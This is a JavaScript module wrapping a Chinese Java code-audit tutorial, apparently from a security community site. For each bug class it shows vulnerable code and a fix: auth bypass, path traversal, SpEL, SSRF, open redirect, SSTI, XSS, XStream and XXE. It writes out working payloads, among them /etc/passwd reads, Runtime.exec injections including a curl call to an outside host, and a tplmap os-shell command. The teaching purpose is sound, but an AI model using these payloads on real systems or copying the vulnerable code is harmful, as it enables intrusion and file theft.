const n=`# \u3010\u504F\u9776\u573A\u6559\u5B66\u3011\u6587\u7AE0 - Java-Sec\u4EE3\u7801\u5BA1\u8BA1\u6F0F\u6D1E\u7BC7(\u4E8C)  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:57 AM
URL: https://xz.aliyun.com/news/15721
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

## \u524D\u8A00

\u672C\u6587\u7EE7\u627F\u4E0A\u4E00\u7BC7\u5F00\u59CB\u901A\u8FC7\u5B66\u4E60Java\u4EE3\u7801\u5BA1\u8BA1\u6F0F\u6D1E\u7684\u4EE3\u7801\u5F62\u5F0F\uFF0C\u8BE6\u7EC6\u8BB2\u89E3\uFF1AGetRequestURI\u3001PathTraversal\u3001SpEL\u3001SSRF\u3001URLRedirect\u3001SSTI\u3001XSS\u3001XStreamRCE\u4EE5\u53CAXXE\u7B49\u8FD9\u4E9B\u5B9E\u9645Java\u5E94\u7528\u6316\u6D1E\u7684\u4E00\u4E9B\u7ECF\u5178\u4EE3\u7801\u6F0F\u6D1E\u4EE5\u53CA\u5BF9\u5E94\u7684\u4FEE\u590D\u5B66\u4E60\uFF0C\u540E\u7EED\u4E5F\u4F1A\u4E0D\u65AD\u5B66\u4E60\u66F4\u65B0Java\u4EE3\u7801\u6F0F\u6D1E\u5BA1\u8BA1\u7EED\u7BC7...

## GetRequestURI

\u5F53\u5E94\u7528\u5B58\u5728\u9759\u6001\u8D44\u6E90\u76EE\u5F55\uFF0C\u6BD4\u5982\`/css/\`\u76EE\u5F55\uFF0C\u5728\u6743\u9650\u6821\u9A8C\u65F6\u4E00\u822C\u4F1A\u9009\u62E9\u653E\u884C\uFF0C\u5373\u4E0D\u6821\u9A8C\u6743\u9650\u3002\u7814\u53D1\u540C\u5B66\u7528\`getRequestURI()\`\u83B7\u53D6URI\u540E\uFF0C\u5224\u65AD\u662F\u5426\u5305\u542B \`/css/\`\u5B57\u7B26\u4E32\uFF0C\u5982\u679C\u5305\u542B\u5219\u4E0D\u6821\u9A8C\u6743\u9650\u3002\u6B64\u65F6\u5982\u679CURI\u4E3A\`/css/../hello\`\uFF0C\u7528\`getRequestURI()\`\u83B7\u53D6\u7684URI\u662F\`/css/../hello\`\uFF0C\u5305\u542B\`/css/\`\u5B57\u7B26\u4E32\uFF0C\u6240\u4EE5\u4E0D\u6821\u9A8C\u6743\u9650\u3002\u4F46\u662F\u6B64\u65F6\u540E\u7AEF\u7684\u8DEF\u7531\u4E3A\`/hello\`\uFF0C\u5BFC\u81F4\u6743\u9650\u7ED5\u8FC7\u3002

\u6F0F\u6D1E\u4EE3\u7801

@RestController
@RequestMapping("uri")
public class GetRequestURI {
private final Logger logger = LoggerFactory.getLogger(this.getClass());
@GetMapping(value = "/exclued/vuln")
public String exclued(HttpServletRequest request) {
String[] excluedPath = {"/css/**", "/js/**"};
String uri = request.getRequestURI(); // Security: request.getServletPath()
PathMatcher matcher = new AntPathMatcher();
logger.info("getRequestURI: " + uri);
logger.info("getServletPath: " + request.getServletPath());
for (String path : excluedPath) {
if (matcher.match(path, uri)) {
return "You have bypassed the login page.";
}
}
return "This is a login page >..<";
}
}

\u5982\u679C\u6211\u4EEC\u8FD9\u6837\u8BF7\u6C42\u5373\u53EF\u7ED5\u8FC7\u767B\u5F55

\`\`\`
/css/..;/exclued/vuln
\`\`\`

\u5B89\u5168\u7684\u65B9\u6CD5\u662F\u4F7F\u7528\uFF1AgetServletPath()\u65B9\u6CD5\uFF0C\u8BE5\u65B9\u6CD5\u4F1A\u81EA\u52A8\u5BF9URL\u8FDB\u884C\u6807\u51C6\u5316(normalize)\uFF0C\u5148\u5BF9URI\u8FDB\u884CURLDecode\uFF0C\u5982\u679C\u5B58\u5728\`/../\`\uFF0C\u5C06\u5176\u8FD4\u56DE\u5230\u4E0A\u4E00\u7EA7\u76EE\u5F55\uFF0C\u5373/css/..;/exclued/vuln/\u5904\u7406\u4E3A/exclued/vuln/\uFF0C\u5E76\u5C06\u65B0\u7684Path\u8BBE\u7F6E\u4E3AservletPath\u3002

## PathTraversal

\u8DEF\u5F84\u904D\u5386\u653B\u51FB\u662F\u6307\u7684\u662F\u901A\u8FC7\u4F7F\u7528\`..\`\u548C\`\\\`\u6765\u8FBE\u5230\u7A7F\u68AD\u76EE\u5F55\uFF0C\u8BBF\u95EE\u4EFB\u610F\u6587\u4EF6\u7684\u76EE\u7684

\u6F0F\u6D1E\u4EE3\u7801

@GetMapping("/path_traversal/vul")
public String getImage(String filepath) throws IOException {
return getImgBase64(filepath);
}
private String getImgBase64(String imgFile) throws IOException {
logger.info("Working directory: " + System.getProperty("user.dir"));
logger.info("File path: " + imgFile);
File f = new File(imgFile);
if (f.exists() && !f.isDirectory()) {
byte[] data = Files.readAllBytes(Paths.get(imgFile));
return new String(Base64.encodeBase64(data));
} else {
return "File doesn't exist or is not a file.";
}
}

\u7531\u4E8E\u6CA1\u6709\u5BF9\u6587\u4EF6\u540D\u5B57\u8FDB\u884C\u6821\u9A8C\u53EF\u4EE5\u76EE\u5F55\u904D\u5386

\`\`\`
?filepath=../../../../../../../../etc/passwd
\`\`\`

\u901A\u8FC7url\u89E3\u7801\uFF0C\u7136\u540E\u5220\u9664\u6076\u610F\u7B26\u53F7\u4FEE\u590D\u4EE3\u7801

@GetMapping("/path_traversal/sec")
public String getImageSec(String filepath) throws IOException {
if (SecurityUtil.pathFilter(filepath) == null) {
logger.info("Illegal file path: " + filepath);
return "Bad boy. Illegal file path.";
}
return getImgBase64(filepath);
}
public static String pathFilter(String filepath) {
String temp = filepath;
// use while to sovle multi urlencode
while (temp.indexOf('%') != -1) {
try {
temp = URLDecoder.decode(temp, "utf-8");
} catch (UnsupportedEncodingException e) {
logger.info("Unsupported encoding exception: " + filepath);
return null;
} catch (Exception e) {
logger.info(e.toString());
return null;
}
}
if (temp.contains("..") || temp.charAt(0) == '/') {
return null;
}
return filepath;
}

## SpEL

Spring Expression Language \u662F\u4E00\u79CD\u8868\u8FBE\u5F0F\u8BED\u8A00\uFF0C\u652F\u6301\u8FD0\u884C\u65F6\u67E5\u8BE2\u548C\u64CD\u4F5C\u5BF9\u8C61\u56FE\uFF0C\u540C\u65F6\u4E5F\u6709\u65B9\u6CD5\u8C03\u7528\u548C\u5B57\u7B26\u4E32\u6A21\u677F\u529F\u80FD

SpEL\u4F7F\u7528 \`#{...}\` \u4F5C\u4E3A\u5B9A\u754C\u7B26\uFF0C\u6240\u6709\u5728\u5927\u62EC\u53F7\u4E2D\u7684\u5B57\u7B26\u90FD\u5C06\u88AB\u8BA4\u4E3A\u662F SpEL\u8868\u8FBE\u5F0F\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5728\u5176\u4E2D\u4F7F\u7528\u8FD0\u7B97\u7B26\uFF0C\u53D8\u91CF\u4EE5\u53CA\u5F15\u7528bean\uFF0C\u5C5E\u6027\u548C\u65B9\u6CD5\u5982\uFF1A

\u5F15\u7528\u5176\u4ED6\u5BF9\u8C61:\`#{car}\`
\u5F15\u7528\u5176\u4ED6\u5BF9\u8C61\u7684\u5C5E\u6027\uFF1A\`#{car.brand}\`
\u8C03\u7528\u5176\u5B83\u65B9\u6CD5 , \u8FD8\u53EF\u4EE5\u94FE\u5F0F\u64CD\u4F5C\uFF1A\`#{car.toString()}\`

1.\u7C7B\u7C7B\u578B\u8868\u8FBE\u5F0F

\u4F7F\u7528\`T()\`\u8FD0\u7B97\u7B26\u4F1A\u8C03\u7528\u7C7B\u4F5C\u7528\u57DF\u7684\u9759\u6001\u5C5E\u6027\u6216\u9759\u6001\u65B9\u6CD5\uFF0CSpEL\u5185\u7F6E\u4E86\`java.lang\`\u5305\u4E0B\u7684\u7C7B\u58F0\u660E\uFF0C\u4E5F\u5C31\u662F\u8BF4\`java.lang.String\`\u53EF\u4EE5\u901A\u8FC7\`T(String)\`\u8BBF\u95EE\uFF0C\u800C\u4E0D\u9700\u8981\u4F7F\u7528\u5168\u9650\u5B9A\u540D
\u6BD4\u5982\uFF1A

\`\`\`
T(Runtime).getRuntime().exec(\\"open /Applications/Calculator.app\\")
\`\`\`

2.\u7C7B\u5B9E\u4F8B\u5316
\u4F7F\u7528new\u53EF\u4EE5\u76F4\u63A5\u5728SpEL\u4E2D\u521B\u5EFA\u5B9E\u4F8B\uFF0C\u9700\u8981\u521B\u5EFA\u5B9E\u4F8B\u7684\u7C7B\u8981\u901A\u8FC7\u5168\u9650\u5B9A\u540D\u8FDB\u884C\u8BBF\u95EE\u3002
\u6BD4\u5982

\`\`\`
new java.util.Date()
\`\`\`

\u6F0F\u6D1E\u4EE3\u7801

@RequestMapping("/spel/vuln1")
public String spel_vuln1(String value) {
ExpressionParser parser = new SpelExpressionParser();
return parser.parseExpression(value).getValue().toString();
}
public String spel_vuln2(String value) {
StandardEvaluationContext context = new StandardEvaluationContext();
SpelExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(value, new TemplateParserContext());
Object x = expression.getValue(context);    // trigger vulnerability point
return x.toString();   // response
}
public static void main(String[] args) {
ExpressionParser parser = new SpelExpressionParser();
String expression = "1+1";
String result = parser.parseExpression(expression).getValue().toString();
System.out.println(result);
}

\u76F4\u63A5\u5C06\u7528\u6237\u7684\u8F93\u5165\u5F53\u4F5C\u8868\u8FBE\u5F0F\u5185\u5BB9\u8FDB\u884C\u89E3\u6790\uFF0C\u6267\u884C\u4E0B\u7CFB\u7EDF\u547D\u4EE4

\`\`\`
T(java.lang.Runtime).getRuntime().exec("curl vps:2333")
\`\`\`

### \u6A21\u677F\u8868\u8FBE\u5F0F

\u8868\u8FBE\u5F0F\u6A21\u677F\u5141\u8BB8\u6587\u5B57\u6587\u672C\u4E0E\u4E00\u4E2A\u6216\u591A\u4E2A\u89E3\u6790\u5757\u7684\u6DF7\u5408\u3002 \u4F60\u53EF\u4EE5\u6BCF\u4E2A\u89E3\u6790\u5757\u5206\u9694\u524D\u7F00\u548C\u540E\u7F00\u7684\u5B57\u7B26\u3002\u5E76\u4E14\u8981\u4F7F\u7528\`\uFF03{}\`\u4F5C\u4E3A\u5206\u9694\u7B26\u3002
\u6BD4\u5982

String randomPhrase = parser.parseExpression(
"random number is #{T(java.lang.Math).random()}",
new TemplateParserContext()).getValue(String.class);
//evaluates to "random number is 0.703101106101103120010"

\u539F\u56E0\u662F\`TemplateParserContext\`\u7684\u5B9A\u4E49\u5982\u4E0B\u6240\u793A

public class TemplateParserContext implements ParserContext {
public String getExpressionPrefix() {
return "#{";
}
public String getExpressionSuffix() {
return "}";
}
public boolean isTemplate() {
return true;
}
}

\u6F0F\u6D1E\u4EE3\u7801

@RequestMapping("spel/vuln2")
public String spel_vuln2(String value) {
StandardEvaluationContext context = new StandardEvaluationContext();
SpelExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(value, new TemplateParserContext());
Object x = expression.getValue(context);    // trigger vulnerability point
return x.toString();   // response
}

\u547D\u4EE4\u6267\u884C

\`\`\`
#{T(java.lang.Runtime).getRuntime().exec('open -a Calculator')}
\`\`\`

[\u7531\u6D45\u5165\u6DF1SpEL\u8868\u8FBE\u5F0F\u6CE8\u5165\u6F0F\u6D1E - Ruilin (rui0.cn)](http://rui0.cn/archives/1043)

## SSRF

Server-side Request Forge\u670D\u52A1\u7AEF\u8BF7\u6C42\u4F2A\u9020\uFF0C\u53EF\u4EE5\u4ECE\u5916\u7F51\u63A2\u6D4B\u6216\u8005\u653B\u51FB\u5185\u7F51\u670D\u52A1

### \u652F\u6301\u534F\u8BAE

file ftp mailto http https jar netdoc

Java\u7684SSRF\u5229\u7528\u65B9\u5F0F\u6BD4\u8F83\u5C40\u9650\uFF1A

- \u5229\u7528file\u534F\u8BAE\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6
- \u5229\u7528http\u534F\u8BAE\u63A2\u6D4B\u7AEF\u53E3\u6216\u653B\u51FB\u5185\u7F51\u670D\u52A1

urlconnection

@RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
public String URLConnectionVuln(String url) {
return HttpUtils.URLConnection(url);
}
public static String URLConnection(String url) {
try {
URL u = new URL(url);
URLConnection urlConnection = u.openConnection();
BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
// BufferedReader in = new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));
String inputLine;
StringBuilder html = new StringBuilder();
while ((inputLine = in.readLine()) != null) {
html.append(inputLine);
}
in.close();
return html.toString();
} catch (Exception e) {
logger.error(e.getMessage());
return e.getMessage();
}
}

ssrf\u4EFB\u610F\u6587\u4EF6\u8BFB

\`\`\`
?url=file:///etc/passwd
\`\`\`

\u4EE3\u7801\u4FEE\u590D

\u5148\u68C0\u9A8C\u534F\u8BAE\u662F\u5426\u5B89\u5168

@GetMapping("/urlConnection/sec")
public String URLConnectionSec(String url) {
// Decline not http/https protocol
if (!SecurityUtil.isHttp(url)) {
return "[-] SSRF check failed";
}
try {
SecurityUtil.startSSRFHook();
return HttpUtils.URLConnection(url);
} catch (SSRFException | IOException e) {
return e.getMessage();
} finally {
SecurityUtil.stopSSRFHook();
}
}
public static boolean isHttp(String url) {
return url.startsWith("http://") || url.startsWith("https://");
}

\u540C\u65F6\u8C03\u7528\u94A9\u5B50\u53BB\u8C03\u7528SocketHookFactory

package org.joychou.security.ssrf;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.util.ArrayList;
import org.apache.commons.lang.StringUtils;
import org.apache.commons.net.util.SubnetUtils;
import org.joychou.config.WebConfig;
import org.joychou.security.SecurityUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
public class SSRFChecker {
private static Logger logger = LoggerFactory.getLogger(SSRFChecker.class);
public static boolean checkURLFckSSRF(String url) {
if (null == url) {
return false;
}
ArrayList<String> ssrfSafeDomains = WebConfig.getSsrfSafeDomains();
try {
String host = SecurityUtil.gethost(url);
// \u5FC5\u987Bhttp/https
if (!SecurityUtil.isHttp(url)) {
return false;
}
if (ssrfSafeDomains.contains(host)) {
return true;
}
for (String ssrfSafeDomain : ssrfSafeDomains) {
if (host.endsWith("." + ssrfSafeDomain)) {
return true;
}
}
} catch (Exception e) {
logger.error(e.toString());
return false;
}
return false;
}
/**
* \u89E3\u6790url\u7684ip\uFF0C\u5224\u65ADip\u662F\u5426\u662F\u5185\u7F51ip\uFF0C\u6240\u4EE5TTL\u8BBE\u7F6E\u4E3A0\u7684\u60C5\u51B5\u4E0D\u9002\u7528\u3002
* url\u53EA\u5141\u8BB8https\u6216\u8005http\uFF0C\u5E76\u4E14\u8BBE\u7F6E\u9ED8\u8BA4\u8FDE\u63A5\u8D85\u65F6\u65F6\u95F4\u3002
* \u8BE5\u4FEE\u590D\u65B9\u6848\u4F1A\u4E3B\u52A8\u8BF7\u6C42\u91CD\u5B9A\u5411\u540E\u7684\u94FE\u63A5\u3002
*
* @param url        check\u7684url
* @param checkTimes \u8BBE\u7F6E\u91CD\u5B9A\u5411\u68C0\u6D4B\u7684\u6700\u5927\u6B21\u6570\uFF0C\u5EFA\u8BAE\u8BBE\u7F6E\u4E3A10\u6B21
* @return \u5B89\u5168\u8FD4\u56DEtrue\uFF0C\u5371\u9669\u8FD4\u56DEfalse
*/
public static boolean checkSSRF(String url, int checkTimes) {
HttpURLConnection connection;
int connectTime = 5 * 1000;  // \u8BBE\u7F6E\u8FDE\u63A5\u8D85\u65F6\u65F6\u95F45s
int i = 1;
String finalUrl = url;
try {
do {
// \u5224\u65AD\u5F53\u524D\u8BF7\u6C42\u7684URL\u662F\u5426\u662F\u5185\u7F51ip
if (isInternalIpByUrl(finalUrl)) {
logger.error("[-] SSRF check failed. Dangerous url: " + finalUrl);
return false;  // \u5185\u7F51ip\u76F4\u63A5return\uFF0C\u975E\u5185\u7F51ip\u7EE7\u7EED\u5224\u65AD\u662F\u5426\u6709\u91CD\u5B9A\u5411
}
connection = (HttpURLConnection) new URL(finalUrl).openConnection();
connection.setInstanceFollowRedirects(false);
connection.setUseCaches(false); // \u8BBE\u7F6E\u4E3Afalse\uFF0C\u624B\u52A8\u5904\u7406\u8DF3\u8F6C\uFF0C\u53EF\u4EE5\u62FF\u5230\u6BCF\u4E2A\u8DF3\u8F6C\u7684URL
connection.setConnectTimeout(connectTime);
//connection.setRequestMethod("GET");
connection.connect(); // send dns request
int responseCode = connection.getResponseCode(); // \u53D1\u8D77\u7F51\u7EDC\u8BF7\u6C42
if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {
String redirectedUrl = connection.getHeaderField("Location");
if (null == redirectedUrl)
break;
finalUrl = redirectedUrl;
i += 1;  // \u91CD\u5B9A\u5411\u6B21\u6570\u52A01
logger.info("redirected url: " + finalUrl);
if (i == checkTimes) {
return false;
}
} else
break;
} while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);
connection.disconnect();
} catch (Exception e) {
return true;  // \u5982\u679C\u5F02\u5E38\u4E86\uFF0C\u8BA4\u4E3A\u662F\u5B89\u5168\u7684\uFF0C\u9632\u6B62\u662F\u8D85\u65F6\u5BFC\u81F4\u7684\u5F02\u5E38\u800C\u9A8C\u8BC1\u4E0D\u6210\u529F\u3002
}
return true; // \u9ED8\u8BA4\u8FD4\u56DEtrue
}
/**
* \u5224\u65AD\u4E00\u4E2AURL\u7684IP\u662F\u5426\u662F\u5185\u7F51IP
*
* @return \u5982\u679C\u662F\u5185\u7F51IP\uFF0C\u8FD4\u56DEtrue\uFF1B\u975E\u5185\u7F51IP\uFF0C\u8FD4\u56DEfalse\u3002
*/
public static boolean isInternalIpByUrl(String url) {
String host = url2host(url);
if (host.equals("")) {
return true; // \u5F02\u5E38URL\u5F53\u6210\u5185\u7F51IP\u7B49\u975E\u6CD5URL\u5904\u7406
}
String ip = host2ip(host);
if (ip.equals("")) {
return true; // \u5982\u679C\u57DF\u540D\u8F6C\u6362\u4E3AIP\u5F02\u5E38\uFF0C\u5219\u8BA4\u4E3A\u662F\u975E\u6CD5URL
}
return isInternalIp(ip);
}
/**
* \u4F7F\u7528SubnetUtils\u5E93\u5224\u65ADip\u662F\u5426\u5728\u5185\u7F51\u7F51\u6BB5
*
* @param strIP ip\u5B57\u7B26\u4E32
* @return \u5982\u679C\u662F\u5185\u7F51ip\uFF0C\u8FD4\u56DEtrue\uFF0C\u5426\u5219\u8FD4\u56DEfalse\u3002
*/
static boolean isInternalIp(String strIP) {
if (StringUtils.isEmpty(strIP)) {
logger.error("[-] SSRF check failed. IP is empty. " + strIP);
return true;
}
ArrayList<String> blackSubnets = WebConfig.getSsrfBlockIps();
for (String subnet : blackSubnets) {
SubnetUtils utils = new SubnetUtils(subnet);
if (utils.getInfo().isInRange(strIP)) {
logger.error("[-] SSRF check failed. Internal IP: " + strIP);
return true;
}
}
return false;
}
/**
* host\u8F6C\u6362\u4E3AIP
* \u4F1A\u5C06\u5404\u79CD\u8FDB\u5236\u7684ip\u8F6C\u4E3A\u6B63\u5E38ip
* 167772161\u8F6C\u6362\u4E3A10.0.0.1
* 127.0.0.1.xip.io\u8F6C\u6362\u4E3A127.0.0.1
*
* @param host \u57DF\u540Dhost
*/
private static String host2ip(String host) {
try {
InetAddress IpAddress = InetAddress.getByName(host); //  send dns request
return IpAddress.getHostAddress();
} catch (Exception e) {
return "";
}
}
/**
* \u4ECEURL\u4E2D\u83B7\u53D6host\uFF0C\u9650\u5236\u4E3Ahttp/https\u534F\u8BAE\u3002\u53EA\u652F\u6301http:// \u548C https://\uFF0C\u4E0D\u652F\u6301//\u7684http\u534F\u8BAE\u3002
*
* @param url http\u7684url
*/
private static String url2host(String url) {
try {
// \u4F7F\u7528URI\uFF0C\u800C\u975EURL\uFF0C\u9632\u6B62\u88AB\u7ED5\u8FC7\u3002
URI u = new URI(url);
if (SecurityUtil.isHttp(url)) {
return u.getHost();
}
return "";
} catch (Exception e) {
return "";
}
}
}

## URLRedirect

url\u91CD\u5B9A\u5411\u6F0F\u6D1E\u4E3B\u8981\u7528\u6765\u9493\u9C7C\uFF0C\u91CD\u5B9A\u5411\u8DF3\u8F6C\u4EE3\u7801:

@GetMapping("/redirect")
public String redirect(@RequestParam("url") String url) {
return "redirect:" + url;
}

payload

\`\`\`
?url=http://www.baidu.com
\`\`\`

301\u8DF3\u8F6C

@RequestMapping("/setHeader")
@ResponseBody
public static void setHeader(HttpServletRequest request, HttpServletResponse response) {
String url = request.getParameter("url");
response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect
response.setHeader("Location", url);
}

302\u8DF3\u8F6C\uFF1A

@RequestMapping("/sendRedirect")
@ResponseBody
public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {
String url = request.getParameter("url");
response.sendRedirect(url); // 302 redirect
}

\u4FEE\u590D\u4EE3\u7801
\u53EA\u80FD\u5185\u90E8\u8DF3\u8F6C

@RequestMapping("/forward")
@ResponseBody
public static void forward(HttpServletRequest request, HttpServletResponse response) {
String url = request.getParameter("url");
RequestDispatcher rd = request.getRequestDispatcher(url);
try {
rd.forward(request, response);
} catch (Exception e) {
e.printStackTrace();
}
}

\u901A\u8FC7checkURL\u53BB\u68C0\u67E5\u8F93\u5165\u7684\u53C2\u6570

@RequestMapping("/sendRedirect/sec")
@ResponseBody
public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)
throws IOException {
String url = request.getParameter("url");
if (SecurityUtil.checkURL(url) == null) {
response.setStatus(HttpServletResponse.SC_FORBIDDEN);
response.getWriter().write("url forbidden");
return;
}
response.sendRedirect(url);
}
}

\u8DDF\u8FDB

/**
* \u540C\u65F6\u652F\u6301\u4E00\u7EA7\u57DF\u540D\u548C\u591A\u7EA7\u57DF\u540D\uFF0C\u76F8\u5173\u914D\u7F6E\u5728resources\u76EE\u5F55\u4E0Burl/url_safe_domain.xml\u6587\u4EF6\u3002
* \u4F18\u5148\u5224\u65AD\u9ED1\u540D\u5355\uFF0C\u5982\u679C\u6EE1\u8DB3\u9ED1\u540D\u5355return null\u3002
*
* @param url the url need to check
* @return Safe url returns original url; Illegal url returns null;
*/
public static String checkURL(String url) {
if (null == url){
return null;
}
ArrayList<String> safeDomains = WebConfig.getSafeDomains();
ArrayList<String> blockDomains = WebConfig.getBlockDomains();
try {
String host = gethost(url);
// \u5FC5\u987Bhttp/https
if (!isHttp(url)) {
return null;
}
// \u5982\u679C\u6EE1\u8DB3\u9ED1\u540D\u5355\u8FD4\u56DEnull
if (blockDomains.contains(host)){
return null;
}
for(String blockDomain: blockDomains) {
if(host.endsWith("." + blockDomain)) {
return null;
}
}
// \u652F\u6301\u591A\u7EA7\u57DF\u540D
if (safeDomains.contains(host)){
return url;
}
// \u652F\u6301\u4E00\u7EA7\u57DF\u540D
for(String safedomain: safeDomains) {
if(host.endsWith("." + safedomain)) {
return url;
}
}
return null;
} catch (NullPointerException e) {
logger.error(e.toString());
return null;
}
}

\u68C0\u6D4B\u76F8\u5173url\u662F\u5426\u5728\u81EA\u5DF1\u914D\u7F6E\u4E2D\uFF0C\u82E5\u4E0D\u5728\u5219\u8FD4\u56DENULL

## SSTI

\u670D\u52A1\u7AEF\u6A21\u677F\u6CE8\u5165\uFF0CSSTI\u4E3B\u8981\u4E3Apython\u7684\u6846\u67B6jinjia2\u3001mako tornado\u3001django\uFF0CPHP\u6846\u67B6smarty twig\uFF0Cjava\u6846\u67B6 FreeMarker\u3001jade\u3001velocity\u7B49\u4F7F\u7528\u6E32\u67D3\u51FD\u6570\u5E76\u4E14\u4EE3\u7801\u4E0D\u89C4\u8303\u5BFC\u81F4\u4E86\u6F0F\u6D1E\uFF0C\u6A21\u677F\u53EF\u63A7

\u6F0F\u6D1E\u4EE3\u7801

@GetMapping("/velocity")
public void velocity(String template) {
Velocity.init();
VelocityContext context = new VelocityContext();
context.put("author", "Elliot A.");
context.put("address", "217 E Broadway");
context.put("phone", "555-1337");
StringWriter swOut = new StringWriter();
Velocity.evaluate(context, swOut, "test", template);

velocity ssti

\`\`\`
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("")
\`\`\`

\u6216\u8005\u7528tplmap.py\u5DE5\u5177

\`\`\`
python tplmap.py --os-shell -u 'http://localhost:8080/ssti/velocity?template=aa'
\`\`\`

## XSS

\u6709\u4E24\u79CD\u5229\u7528\u573A\u666F

\u7B2C\u4E00\u79CD\u4EE3\u7801\u5982\u4E0B

\`\`\`
@RequestMapping("/reflect")  
@ResponseBody  
public static String reflect(String xss) {  
    return xss;  
}
\`\`\`

\u6211\u4EEC\u8BBF\u95EE\u5C31\u4F1A\u89E6\u53D1xss

\`\`\`
reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E
\`\`\`

\u5C06XSS\u8BED\u53E5\u5E26\u5165cookie\uFF0C\u7136\u540E\u5728\u5176\u4ED6\u5904\u8C03\u51FA\u9020\u6210XSS

@RequestMapping("/stored/store")
@ResponseBody
public String store(String xss, HttpServletResponse response) {
Cookie cookie = new Cookie("xss", xss);
response.addCookie(cookie);
return "Set param into cookie";
}
@RequestMapping("/stored/show")
@ResponseBody
public String show(@CookieValue("xss") String xss) {
return xss;
}

\u4FEE\u590D\u4EE3\u7801

@RequestMapping("/safe")
@ResponseBody
public static String safe(String xss) {
return encode(xss);
}
private static String encode(String origin) {
origin = StringUtils.replace(origin, "&", "&");
origin = StringUtils.replace(origin, "<", "<");
origin = StringUtils.replace(origin, ">", ">");
origin = StringUtils.replace(origin, "\\"", """);
origin = StringUtils.replace(origin, "'", "'");
origin = StringUtils.replace(origin, "/", "/");
return origin;
}

## XStreamRCE

XStream\u662F\u4E00\u4E2A\u7B80\u5355\u7684\u57FA\u4E8EJava\u5E93\uFF0C\u53EF\u4EE5\u628AJava\u5BF9\u8C61\u5E8F\u5217\u5316\u5230XML

\u6709RCE\u6F0F\u6D1E\u53D7\u5F71\u54CD\u7248\u672C\uFF1A
Xstream affected version: 1.4.10 or <= 1.4.6
[\u3010\u6F0F\u6D1E\u590D\u73B0\u3011CVE-2020-26217 | XStream\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E - 303donatello - \u535A\u5BA2\u56ED (cnblogs.com)](https://www.cnblogs.com/303donatello/p/13998245.html)

\u8FD8\u67092021cve\u4E00\u5927\u5806:[Xstream \u53CD\u5E8F\u5217\u5316\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u6DF1\u5165\u5206\u6790 (seebug.org)](https://paper.seebug.org/1543/#2-cve-2021-21344)
\u6F0F\u6D1E\u4EE3\u7801

@PostMapping("/xstream")
public String parseXml(HttpServletRequest request) throws Exception {
String xml = WebUtils.getRequestBody(request);
XStream xstream = new XStream(new DomDriver());
xstream.fromXML(xml);
return "xstream";
}
public static void main(String[] args) {
User user = new User();
user.setId(0);
user.setUsername("admin");
XStream xstream = new XStream(new DomDriver());
String xml = xstream.toXML(user); // Serialize
System.out.println(xml);
user = (User) xstream.fromXML(xml); // Deserialize
System.out.println(user.getId() + ": " + user.getUsername());
}
}

\u547D\u4EE4\u6267\u884C

## XXE

XML\u5916\u90E8\u5B9E\u4F53\u6CE8\u5165\uFF0C\u5728\u5E94\u7528\u7A0B\u5E8F\u89E3\u6790XML\u8F93\u5165\u65F6\uFF0C\u5F53\u5141\u8BB8\u5F15\u7528\u5916\u90E8\u5B9E\u4F53\u65F6\uFF0C\u53EF\u4EE5\u6784\u9020\u6076\u610F\u5185\u5BB9\u5BFC\u81F4\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u6216SSRF\u3001\u7AEF\u53E3\u63A2\u6D4B\u3001\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4

\u6F0F\u6D1E\u4EE3\u7801

@RequestMapping(value = "/DocumentBuilder/vuln01", method = RequestMethod.POST)
public String DocumentBuilderVuln01(HttpServletRequest request) {
try {
String body = WebUtils.getRequestBody(request);
logger.info(body);
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
StringReader sr = new StringReader(body);
InputSource is = new InputSource(sr);
Document document = db.parse(is);  // parse xml
// \u904D\u5386xml\u8282\u70B9name\u548Cvalue
StringBuilder buf = new StringBuilder();
NodeList rootNodeList = document.getChildNodes();
for (int i = 0; i < rootNodeList.getLength(); i++) {
Node rootNode = rootNodeList.item(i);
NodeList child = rootNode.getChildNodes();
for (int j = 0; j < child.getLength(); j++) {
Node node = child.item(j);
buf.append(String.format("%s: %s\\n", node.getNodeName(), node.getTextContent()));
}
}
sr.close();
return buf.toString();
} catch (Exception e) {
logger.error(e.toString());
return EXCEPT;
}
}

\u6B63\u5E38\u6709\u56DE\u663E

<book id="1">
Good Job
ol4three
2021
100.00

\u76F4\u63A5file\u534F\u8BAE\u8BFB\u6587\u4EF6

]>
&xxe;

![](https://xzfile.aliyuncs.com/media/upload/picture/20241116103611-8ad384ec-a3c3-1.png)`;export{n as _};
